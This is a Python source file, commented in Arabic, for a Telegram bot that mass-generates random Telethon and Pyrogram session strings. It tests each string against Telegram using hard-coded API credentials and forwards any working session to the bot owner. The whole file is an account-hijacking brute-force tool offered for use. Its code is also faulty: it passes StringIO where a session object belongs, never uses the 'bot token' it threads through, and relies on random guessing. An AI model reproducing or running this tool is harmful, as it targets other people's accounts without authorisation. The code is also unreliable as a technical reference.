# SessionChecker.py
# فاحص ومولد جلسات تيليجرام - Telethon & Pyrogram
# المتطلبات: 
# python-telegram-bot==13.15
# telethon
# pyrogram
# تثبيت: pip install python-telegram-bot==13.15 telethon pyrogram
# تشغيل: python SessionChecker.py
# الضبط عبر المتغيرات البيئية: BOT_TOKEN, BOT_OWNER_ID

import os
import time
import random
import string
import math
import base64
import json
import asyncio
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, FIRST_COMPLETED
from datetime import datetime
import logging
from collections import deque
import threading
from io import StringIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext, CallbackQueryHandler
from functools import wraps
import secrets
from typing import Dict, List, Set, Optional, Tuple
import hashlib

# مكتبات فحص الجلسات
try:
    from telethon import TelegramClient
    from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, ApiIdInvalidError
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("تحذير: Telethon غير مثبت. قسم فحص Telethon غير متاح.")

try:
    from pyrogram import Client
    from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, ApiIdInvalid
    PYROGRAM_AVAILABLE = True
except ImportError:
    PYROGRAM_AVAILABLE = False
    print("تحذير: Pyrogram غير مثبت. قسم فحص Pyrogram غير متاح.")

# ----------------------
# إعدادات التوليد والبرنامج
# ----------------------
# إعدادات جلسات Telethon (نفس تنسيق Tolid.py)
TELETHON_PREFIX = "1BJWap1sAU"
TELETHON_TOTAL_LENGTH = 344
TELETHON_END_CHAR = "="
TELETHON_MIDDLE_LEN = TELETHON_TOTAL_LENGTH - len(TELETHON_PREFIX) - len(TELETHON_END_CHAR)

# إعدادات جلسات Pyrogram (تنسيق مختلف)
PYROGRAM_PREFIX = "BAADC"
PYROGRAM_TOTAL_LENGTH = 350
PYROGRAM_END_CHAR = "=="
PYROGRAM_MIDDLE_LEN = PYROGRAM_TOTAL_LENGTH - len(PYROGRAM_PREFIX) - len(PYROGRAM_END_CHAR)

ALLOWED_CHARS = string.ascii_letters + string.digits + "-_"
DEFAULT_BATCH = int(os.getenv("DEFAULT_BATCH", "100"))  # دفعات أصغر للفحص
MAX_WORKERS = int(os.getenv("MAX_WORKERS", str(max(1, mp.cpu_count()))))
CHUNK_SIZE = 50  # حجم أصغر للفحص

# حالات المحادثة
ASK_MODE, ASK_COUNT, ADD_BOT_TOKEN, ASK_FILE_PATH = range(4)

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# مصادقة المالك
BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID", "123456789"))

# متغيرات الحالة
active_tasks = {}
checking_bots: List[Dict] = []  # قائمة بوتات الفحص
performance_stats = {
    'total_generated': 0,
    'total_checked': 0,
    'total_valid': 0,
    'total_invalid': 0,
    'total_time': 0.0,
    'success_rate': 0.0
}
task_history = deque(maxlen=200)
stats_lock = threading.Lock()
checked_sessions: Set[str] = set()  # لتجنب التكرار في الفحص
checked_sessions_lock = threading.Lock()

# ----------------------
# مصادقة المالك
# ----------------------
def owner_only(func):
    """ديكورator للتحقق من أن المستخدم هو مالك البوت فقط"""
    @wraps(func)
    def wrapped(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id != BOT_OWNER_ID:
            update.message.reply_text("❌ غير مصرح لك باستخدام هذا البوت.")
            logger.warning(f"محاولة وصول غير مصرح من المستخدم: {user_id}")
            return ConversationHandler.END
        return func(update, context, *args, **kwargs)
    return wrapped

# ----------------------
# دوال توليد الجلسات
# ----------------------
def generate_telethon_session():
    """توليد جلسة Telethon عشوائية"""
    random_part = ''.join(random.choices(ALLOWED_CHARS, k=TELETHON_MIDDLE_LEN))
    return TELETHON_PREFIX + random_part + TELETHON_END_CHAR

def generate_pyrogram_session():
    """توليد جلسة Pyrogram عشوائية"""
    random_part = ''.join(random.choices(ALLOWED_CHARS, k=PYROGRAM_MIDDLE_LEN))
    return PYROGRAM_PREFIX + random_part + PYROGRAM_END_CHAR

def generate_session_batch(session_type, batch_size):
    """توليد دفعة من الجلسات"""
    if session_type == "telethon":
        return [generate_telethon_session() for _ in range(batch_size)]
    elif session_type == "pyrogram":
        return [generate_pyrogram_session() for _ in range(batch_size)]
    return []

# ----------------------
# دوال فحص الجلسات
# ----------------------
async def check_telethon_session(session_string: str, bot_token: str) -> bool:
    """فحص صلاحية جلسة Telethon"""
    if not TELETHON_AVAILABLE:
        return False
    
    try:
        # استخدام API ID وهمي للفحص السريع
        api_id = 6  # API ID تجريبي
        api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"  # API Hash تجريبي
        
        client = TelegramClient(StringIO(session_string), api_id, api_hash)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return True
        else:
            await client.disconnect()
            return False
            
    except Exception as e:
        logger.debug(f"خطأ في فحص جلسة Telethon: {e}")
        return False

async def check_pyrogram_session(session_string: str, bot_token: str) -> bool:
    """فحص صلاحية جلسة Pyrogram"""
    if not PYROGRAM_AVAILABLE:
        return False
    
    try:
        # استخدام API ID وهمي للفحص السريع
        api_id = 6
        api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
        
        client = Client("temp_session", api_id, api_hash, session_string=session_string)
        await client.start()
        
        if await client.get_me():
            await client.stop()
            return True
        else:
            await client.stop()
            return False
            
    except Exception as e:
        logger.debug(f"خطأ في فحص جلسة Pyrogram: {e}")
        return False

def check_session_sync(session_string: str, session_type: str, bot_token: str) -> bool:
    """دالة متزامنة لفحص الجلسة"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        if session_type == "telethon":
            result = loop.run_until_complete(check_telethon_session(session_string, bot_token))
        elif session_type == "pyrogram":
            result = loop.run_until_complete(check_pyrogram_session(session_string, bot_token))
        else:
            result = False
            
        loop.close()
        return result
    except Exception as e:
        logger.error(f"خطأ في فحص الجلسة المتزامن: {e}")
        return False

# ----------------------
# دوال مساعدة
# ----------------------
def progress_bar(percentage, length=20):
    """إنشاء شريط تقدم نصي"""
    filled = int(length * percentage / 100)
    empty = length - filled
    return f"[{'█' * filled}{'░' * empty}] {percentage:.1f}%"

def log_activity(action, details=""):
    """تسجيل النشاط في الذاكرة فقط"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"{timestamp} - {action} - {details}"
    logger.info(log_message)
    task_history.append(log_message)

def monitor_performance(generated, checked, valid, invalid, elapsed_time):
    """تحديث إحصاءات الأداء"""
    with stats_lock:
        performance_stats['total_generated'] += generated
        performance_stats['total_checked'] += checked
        performance_stats['total_valid'] += valid
        performance_stats['total_invalid'] += invalid
        performance_stats['total_time'] += elapsed_time
        
        if performance_stats['total_checked'] > 0:
            performance_stats['success_rate'] = (performance_stats['total_valid'] / performance_stats['total_checked']) * 100

def is_session_checked(session_string: str) -> bool:
    """التحقق من أن الجلسة لم يتم فحصها مسبقاً"""
    session_hash = hashlib.md5(session_string.encode()).hexdigest()
    with checked_sessions_lock:
        if session_hash in checked_sessions:
            return True
        checked_sessions.add(session_hash)
        return False

def get_available_bot() -> Optional[str]:
    """الحصول على بوت فحص متاح"""
    if not checking_bots:
        return None
    # يمكن تحسين هذا لاختيار البوت الأقل استخداماً
    return random.choice(checking_bots)['token']

# ----------------------
# دوال إدارة بوتات الفحص
# ----------------------
def add_checking_bot(token: str) -> bool:
    """إضافة بوت فحص جديد"""
    try:
        # التحقق من صلاحية التوكن
        import requests
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        if response.status_code == 200:
            bot_info = response.json()
            if bot_info.get('ok'):
                bot_data = {
                    'token': token,
                    'username': bot_info['result']['username'],
                    'added_at': datetime.now().isoformat(),
                    'status': 'active'
                }
                checking_bots.append(bot_data)
                save_bots_config()
                return True
        return False
    except Exception as e:
        logger.error(f"خطأ في إضافة بوت الفحص: {e}")
        return False

def remove_checking_bot(index: int) -> bool:
    """حذف بوت فحص"""
    try:
        if 0 <= index < len(checking_bots):
            checking_bots.pop(index)
            save_bots_config()
            return True
        return False
    except Exception:
        return False

def save_bots_config():
    """حفظ إعدادات البوتات في ملف"""
    try:
        with open('checking_bots.json', 'w', encoding='utf-8') as f:
            json.dump(checking_bots, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"خطأ في حفظ إعدادات البوتات: {e}")

def load_bots_config():
    """تحميل إعدادات البوتات من الملف"""
    global checking_bots
    try:
        if os.path.exists('checking_bots.json'):
            with open('checking_bots.json', 'r', encoding='utf-8') as f:
                checking_bots = json.load(f)
    except Exception as e:
        logger.error(f"خطأ في تحميل إعدادات البوتات: {e}")
        checking_bots = []

# ----------------------
# العملية الرئيسية للتوليد والفحص
# ----------------------
def session_generation_and_check_process(session_type: str, chat_id: int, context: CallbackContext, progress_message_id: int, cancel_event: threading.Event):
    """العملية الرئيسية للتوليد والفحص المستمر"""
    start_time = time.time()
    total_generated = 0
    total_checked = 0
    total_valid = 0
    total_invalid = 0
    last_report_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(checking_bots) if checking_bots else 1)) as executor:
            while not cancel_event.is_set():
                # توليد دفعة جديدة
                batch = generate_session_batch(session_type, DEFAULT_BATCH)
                total_generated += len(batch)
                
                # فحص الدفعة
                futures = []
                for session in batch:
                    if cancel_event.is_set():
                        break
                    
                    # تجنب التكرار في الفحص
                    if is_session_checked(session):
                        continue
                    
                    # الحصول على بوت فحص متاح
                    bot_token = get_available_bot()
                    if not bot_token:
                        logger.warning("لا توجد بوتات فحص متاحة")
                        time.sleep(1)
                        continue
                    
                    future = executor.submit(check_session_sync, session, session_type, bot_token)
                    futures.append((future, session))
                
                # معالجة النتائج
                for future, session in futures:
                    if cancel_event.is_set():
                        break
                    
                    try:
                        is_valid = future.result(timeout=30)
                        total_checked += 1
                        
                        if is_valid:
                            total_valid += 1
                            # إرسال الجلسة الصالحة فوراً
                            try:
                                context.bot.send_message(
                                    chat_id=chat_id,
                                    text=f"✅ جلسة {session_type.title()} صالحة:\n\n`{session}`",
                                    parse_mode="Markdown"
                                )
                                log_activity("VALID_SESSION", f"جلسة {session_type} صالحة تم إرسالها")
                            except Exception as e:
                                logger.error(f"خطأ في إرسال الجلسة الصالحة: {e}")
                        else:
                            total_invalid += 1
                            
                    except Exception as e:
                        logger.error(f"خطأ في فحص الجلسة: {e}")
                        total_invalid += 1
                
                # تحديث التقدم كل 30 ثانية
                now = time.time()
                if now - last_report_time >= 30:
                    elapsed = now - start_time
                    success_rate = (total_valid / total_checked * 100) if total_checked > 0 else 0
                    
                    try:
                        context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=progress_message_id,
                            text=(
                                f"🔍 فحص جلسات {session_type.title()}\n\n"
                                f"📊 الإحصائيات:\n"
                                f"• مولد: {total_generated}\n"
                                f"• مفحوص: {total_checked}\n"
                                f"• صالح: {total_valid} ✅\n"
                                f"• غير صالح: {total_invalid} ❌\n"
                                f"• معدل النجاح: {success_rate:.2f}%\n"
                                f"• الوقت المنقضي: {int(elapsed)} ثانية\n\n"
                                f"🤖 بوتات الفحص النشطة: {len(checking_bots)}"
                            )
                        )
                    except Exception as e:
                        logger.debug(f"تعذر تحديث رسالة التقدم: {e}")
                    
                    # تحديث الإحصائيات العامة
                    monitor_performance(len(batch), len(futures), 
                                      sum(1 for f, _ in futures if f.done() and f.result()), 
                                      sum(1 for f, _ in futures if f.done() and not f.result()),
                                      now - last_report_time)
                    
                    last_report_time = now
                
                # توقف قصير لتجنب الإرهاق
                if not cancel_event.is_set():
                    time.sleep(0.1)
                    
    except Exception as e:
        logger.exception(f"خطأ في عملية التوليد والفحص: {e}")
        try:
            context.bot.edit_message_text(
                chat_id=chat_id, 
                message_id=progress_message_id, 
                text=f"❌ حدث خطأ أثناء العملية: {e}"
            )
        except Exception:
            pass
    
    finally:
        # الإبلاغ عن النتيجة النهائية
        total_time = time.time() - start_time
        success_rate = (total_valid / total_checked * 100) if total_checked > 0 else 0
        
        try:
            if cancel_event.is_set():
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_message_id,
                    text=(
                        f"⏹️ تم إيقاف عملية فحص {session_type.title()}\n\n"
                        f"📊 النتائج النهائية:\n"
                        f"• مولد: {total_generated}\n"
                        f"• مفحوص: {total_checked}\n"
                        f"• صالح: {total_valid} ✅\n"
                        f"• غير صالح: {total_invalid} ❌\n"
                        f"• معدل النجاح: {success_rate:.2f}%\n"
                        f"• إجمالي الوقت: {int(total_time)} ثانية"
                    )
                )
                log_activity("CANCELLED", f"أوقف المستخدم فحص {session_type} بعد {total_checked} فحص")
            else:
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_message_id,
                    text=(
                        f"✅ اكتملت عملية فحص {session_type.title()}\n\n"
                        f"📊 النتائج النهائية:\n"
                        f"• مولد: {total_generated}\n"
                        f"• مفحوص: {total_checked}\n"
                        f"• صالح: {total_valid} ✅\n"
                        f"• غير صالح: {total_invalid} ❌\n"
                        f"• معدل النجاح: {success_rate:.2f}%\n"
                        f"• إجمالي الوقت: {int(total_time)} ثانية"
                    )
                )
                log_activity("COMPLETED", f"اكتملت عملية فحص {session_type}")
        except Exception:
            pass
        
        # إزالة المهمة من القائمة النشطة
        if chat_id in active_tasks:
            del active_tasks[chat_id]

# ----------------------
# معالجات أوامر البوت
# ----------------------
@owner_only
def start(update: Update, context: CallbackContext):
    keyboard = [
        [
            InlineKeyboardButton("🔍 Telethon", callback_data="mode_telethon"),
            InlineKeyboardButton("🔍 Pyrogram", callback_data="mode_pyrogram")
        ],
        [
            InlineKeyboardButton("📁 فحص ملف", callback_data="mode_file_check"),
        ],
        [
            InlineKeyboardButton("🤖 إدارة بوتات الفحص", callback_data="manage_bots"),
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        "🔍 **مرحباً بك في فاحص الجلسات**\n\n"
        "اختر نوع العملية التي تريد تنفيذها:\n\n"
        "🔹 **Telethon**: توليد وفحص جلسات تيليثون\n"
        "🔹 **Pyrogram**: توليد وفحص جلسات بايروجرام\n"
        "🔹 **فحص ملف**: فحص جلسات من ملف محفوظ\n"
        "🔹 **إدارة البوتات**: إضافة/حذف بوتات الفحص\n\n"
        f"📊 بوتات الفحص النشطة: {len(checking_bots)}",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )
    log_activity("START", "بدء استخدام فاحص الجلسات")
    return ASK_MODE

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    
    if query.data.startswith("mode_"):
        mode = query.data.replace("mode_", "")
        context.user_data['mode'] = mode
        
        if mode in ["telethon", "pyrogram"]:
            if not checking_bots:
                query.edit_message_text(
                    "⚠️ لا توجد بوتات فحص مضافة!\n\n"
                    "يجب إضافة بوت فحص واحد على الأقل قبل البدء.\n"
                    "استخدم الزر 'إدارة بوتات الفحص' لإضافة بوت."
                )
                return ConversationHandler.END
            
            # التحقق من توفر المكتبة المطلوبة
            if mode == "telethon" and not TELETHON_AVAILABLE:
                query.edit_message_text("❌ مكتبة Telethon غير مثبتة. يرجى تثبيتها أولاً.")
                return ConversationHandler.END
            elif mode == "pyrogram" and not PYROGRAM_AVAILABLE:
                query.edit_message_text("❌ مكتبة Pyrogram غير مثبتة. يرجى تثبيتها أولاً.")
                return ConversationHandler.END
            
            query.edit_message_text(
                f"🔍 اخترت فحص جلسات {mode.title()}\n\n"
                "العملية ستبدأ فوراً وتستمر حتى الإيقاف.\n"
                "ستصلك الجلسات الصالحة في رسائل منفصلة.\n\n"
                "هل تريد البدء؟",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ ابدأ الآن", callback_data=f"start_{mode}")],
                    [InlineKeyboardButton("❌ إلغاء", callback_data="cancel")]
                ])
            )
            
        elif mode == "file_check":
            query.edit_message_text(
                "📁 فحص ملف الجلسات\n\n"
                "أرسل مسار الملف الذي يحتوي على الجلسات المراد فحصها.\n"
                "يجب أن يكون كل سطر يحتوي على جلسة واحدة."
            )
            return ASK_FILE_PATH
            
    elif query.data.startswith("start_"):
        mode = query.data.replace("start_", "")
        chat_id = query.message.chat_id
        
        if chat_id in active_tasks:
            query.edit_message_text("⚠️ هناك مهمة فحص قائمة بالفعل. أرسل /cancel لإيقافها أولاً.")
            return ConversationHandler.END
        
        query.edit_message_text(f"🚀 بدء فحص جلسات {mode.title()}...")
        
        # إنشاء رسالة تقدم
        progress_message = context.bot.send_message(
            chat_id=chat_id,
            text="⏳ جاري التحضير للفحص..."
        )
        
        cancel_event = threading.Event()
        active_tasks[chat_id] = {
            'start_time': time.time(),
            'mode': mode,
            'cancel_event': cancel_event,
            'progress_message_id': progress_message.message_id
        }
        
        # بدء عملية التوليد والفحص في خيط منفصل
        thread = threading.Thread(
            target=session_generation_and_check_process,
            args=(mode, chat_id, context, progress_message.message_id, cancel_event),
            daemon=True
        )
        thread.start()
        
        log_activity("START_CHECKING", f"بدء فحص جلسات {mode}")
        return ConversationHandler.END
        
    elif query.data == "manage_bots":
        bots_list = ""
        if checking_bots:
            for i, bot in enumerate(checking_bots):
                bots_list += f"{i+1}. @{bot['username']} - {bot['status']}\n"
        else:
            bots_list = "لا توجد بوتات مضافة"
        
        keyboard = [
            [InlineKeyboardButton("➕ إضافة بوت فحص", callback_data="add_bot")],
        ]
        
        if checking_bots:
            keyboard.append([InlineKeyboardButton("🗑️ حذف بوت", callback_data="remove_bot")])
        
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")])
        
        query.edit_message_text(
            f"🤖 **إدارة بوتات الفحص**\n\n"
            f"البوتات المضافة ({len(checking_bots)}):\n{bots_list}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    elif query.data == "add_bot":
        query.edit_message_text(
            "🤖 إضافة بوت فحص جديد\n\n"
            "أرسل توكن البوت الذي تريد إضافته:\n"
            "مثال: `123456789:ABCdefGHIjklMNOpqrSTUvwxYZ`",
            parse_mode="Markdown"
        )
        return ADD_BOT_TOKEN
        
    elif query.data == "cancel":
        query.edit_message_text("❌ تم الإلغاء.")
        return ConversationHandler.END
        
    elif query.data == "back_to_main":
        return start(update, context)
    
    return ASK_MODE

@owner_only
def handle_bot_token(update: Update, context: CallbackContext):
    token = update.message.text.strip()
    
    if not token or len(token.split(':')) != 2:
        update.message.reply_text("❌ تنسيق التوكن غير صحيح. يرجى المحاولة مرة أخرى.")
        return ADD_BOT_TOKEN
    
    update.message.reply_text("⏳ جاري التحقق من صلاحية التوكن...")
    
    if add_checking_bot(token):
        update.message.reply_text(
            f"✅ تم إضافة البوت بنجاح!\n"
            f"إجمالي بوتات الفحص: {len(checking_bots)}"
        )
        log_activity("BOT_ADDED", f"تم إضافة بوت فحص جديد")
    else:
        update.message.reply_text("❌ فشل في إضافة البوت. تأكد من صحة التوكن.")
    
    return ConversationHandler.END

@owner_only
def handle_file_path(update: Update, context: CallbackContext):
    file_path = update.message.text.strip()
    
    if not os.path.exists(file_path):
        update.message.reply_text("❌ الملف غير موجود. تأكد من المسار.")
        return ASK_FILE_PATH
    
    update.message.reply_text("🔍 جاري فحص الملف...")
    
    # فحص الملف في خيط منفصل
    thread = threading.Thread(
        target=check_file_sessions,
        args=(file_path, update.effective_chat.id, context),
        daemon=True
    )
    thread.start()
    
    return ConversationHandler.END

def check_file_sessions(file_path: str, chat_id: int, context: CallbackContext):
    """فحص جلسات من ملف"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            sessions = [line.strip() for line in f if line.strip()]
        
        total_sessions = len(sessions)
        valid_sessions = 0
        invalid_sessions = 0
        
        progress_message = context.bot.send_message(
            chat_id=chat_id,
            text=f"📁 فحص {total_sessions} جلسة من الملف...\n⏳ 0/{total_sessions}"
        )
        
        for i, session in enumerate(sessions):
            if is_session_checked(session):
                continue
            
            # تحديد نوع الجلسة
            session_type = "telethon" if session.startswith(TELETHON_PREFIX) else "pyrogram"
            
            # الحصول على بوت فحص
            bot_token = get_available_bot()
            if not bot_token:
                context.bot.send_message(chat_id, "⚠️ لا توجد بوتات فحص متاحة")
                break
            
            # فحص الجلسة
            is_valid = check_session_sync(session, session_type, bot_token)
            
            if is_valid:
                valid_sessions += 1
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"✅ جلسة {session_type.title()} صالحة:\n\n`{session}`",
                    parse_mode="Markdown"
                )
            else:
                invalid_sessions += 1
            
            # تحديث التقدم كل 10 جلسات
            if (i + 1) % 10 == 0 or i == total_sessions - 1:
                try:
                    context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_message.message_id,
                        text=(
                            f"📁 فحص الملف\n\n"
                            f"📊 التقدم: {i+1}/{total_sessions}\n"
                            f"✅ صالح: {valid_sessions}\n"
                            f"❌ غير صالح: {invalid_sessions}\n"
                            f"📈 معدل النجاح: {(valid_sessions/(i+1)*100):.1f}%"
                        )
                    )
                except Exception:
                    pass
        
        # النتيجة النهائية
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=progress_message.message_id,
            text=(
                f"✅ اكتمل فحص الملف\n\n"
                f"📊 النتائج:\n"
                f"• إجمالي: {total_sessions}\n"
                f"• صالح: {valid_sessions} ✅\n"
                f"• غير صالح: {invalid_sessions} ❌\n"
                f"• معدل النجاح: {(valid_sessions/total_sessions*100):.1f}%"
            )
        )
        
        log_activity("FILE_CHECK_COMPLETED", f"فحص {total_sessions} جلسة من ملف")
        
    except Exception as e:
        logger.error(f"خطأ في فحص الملف: {e}")
        context.bot.send_message(chat_id, f"❌ خطأ في فحص الملف: {e}")

@owner_only
def cancel(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id in active_tasks:
        active_tasks[chat_id]['cancel_event'].set()
        log_activity("CANCEL_REQUEST", "طلب إلغاء المهمة")
        update.message.reply_text("⏹️ تم إرسال أمر الإيقاف، جاري إيقاف العملية...")
    else:
        update.message.reply_text("❌ لا توجد عملية جارية للإيقاف.")
    return ConversationHandler.END

@owner_only
def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id in active_tasks:
        task = active_tasks[chat_id]
        elapsed = time.time() - task['start_time']
        
        with stats_lock:
            stats_text = (
                f"📊 **حالة المهمة النشطة**\n\n"
                f"🔍 النوع: {task['mode'].title()}\n"
                f"⏱️ الوقت المنقضي: {int(elapsed)} ثانية\n\n"
                f"📈 **الإحصائيات العامة:**\n"
                f"• مولد: {performance_stats['total_generated']}\n"
                f"• مفحوص: {performance_stats['total_checked']}\n"
                f"• صالح: {performance_stats['total_valid']} ✅\n"
                f"• غير صالح: {performance_stats['total_invalid']} ❌\n"
                f"• معدل النجاح: {performance_stats['success_rate']:.2f}%\n\n"
                f"🤖 بوتات الفحص النشطة: {len(checking_bots)}\n\n"
                f"لإيقاف المهمة أرسل /cancel"
            )
        
        update.message.reply_text(stats_text, parse_mode="Markdown")
    else:
        update.message.reply_text("❌ لا توجد عملية فحص جارية الآن.")
    
    log_activity("STATUS_CHECK", "طلب حالة المهمة")

@owner_only
def dashboard(update: Update, context: CallbackContext):
    active_count = len(active_tasks)
    active_info = "\n".join([
        f"- Chat {cid}: فحص {task['mode'].title()}"
        for cid, task in active_tasks.items()
    ]) if active_tasks else "لا توجد مهام نشطة"
    
    with stats_lock:
        perf_info = (
            f"إجمالي المولد: {performance_stats['total_generated']}\n"
            f"إجمالي المفحوص: {performance_stats['total_checked']}\n"
            f"إجمالي الصالح: {performance_stats['total_valid']}\n"
            f"معدل النجاح: {performance_stats['success_rate']:.2f}%\n"
            f"إجمالي وقت الفحص: {performance_stats['total_time']:.2f} ثانية"
        )
    
    bots_info = f"بوتات الفحص النشطة: {len(checking_bots)}"
    if checking_bots:
        bots_list = "\n".join([f"  • @{bot['username']}" for bot in checking_bots[:5]])
        bots_info += f"\n{bots_list}"
        if len(checking_bots) > 5:
            bots_info += f"\n  ... و {len(checking_bots)-5} بوتات أخرى"
    
    recent_activities = "\n".join(list(task_history)[-5:]) if task_history else "لا توجد أنشطة مسجلة"
    
    update.message.reply_text(
        f"📊 **لوحة التحكم - فاحص الجلسات**\n\n"
        f"🔹 المهام النشطة ({active_count}):\n{active_info}\n\n"
        f"📈 إحصائيات الأداء:\n{perf_info}\n\n"
        f"🤖 {bots_info}\n\n"
        f"📝 آخر الأنشطة:\n{recent_activities}",
        parse_mode="Markdown"
    )
    log_activity("DASHBOARD_VIEW", "عرض لوحة التحكم")

# ----------------------
# نقطة الدخول
# ----------------------
def main():
    BOT_TOKEN = os.getenv("BOT_TOKEN", "")
    
    # التحقق من الإعدادات
    if BOT_OWNER_ID == 123456789:
        logger.error("❗ لم تقم بتعيين معرف المالك الصحيح في BOT_OWNER_ID")
        return
    
    if not BOT_TOKEN:
        logger.error("❗ لم تقم بتعيين متغير البيئة BOT_TOKEN")
        return
    
    # تحميل إعدادات البوتات المحفوظة
    load_bots_config()
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    conv = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_MODE: [CallbackQueryHandler(button_handler)],
            ADD_BOT_TOKEN: [MessageHandler(Filters.text & ~Filters.command, handle_bot_token)],
            ASK_FILE_PATH: [MessageHandler(Filters.text & ~Filters.command, handle_file_path)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    dp.add_handler(conv)
    dp.add_handler(CommandHandler('cancel', cancel))
    dp.add_handler(CommandHandler('status', status))
    dp.add_handler(CommandHandler('dashboard', dashboard))
    
    logger.info("Session Checker Bot started successfully")
    print("Session Checker Bot started. Press Ctrl+C to stop.")
    print(f"Available checking bots: {len(checking_bots)}")
    print(f"Telethon support: {'✅' if TELETHON_AVAILABLE else '❌'}")
    print(f"Pyrogram support: {'✅' if PYROGRAM_AVAILABLE else '❌'}")
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()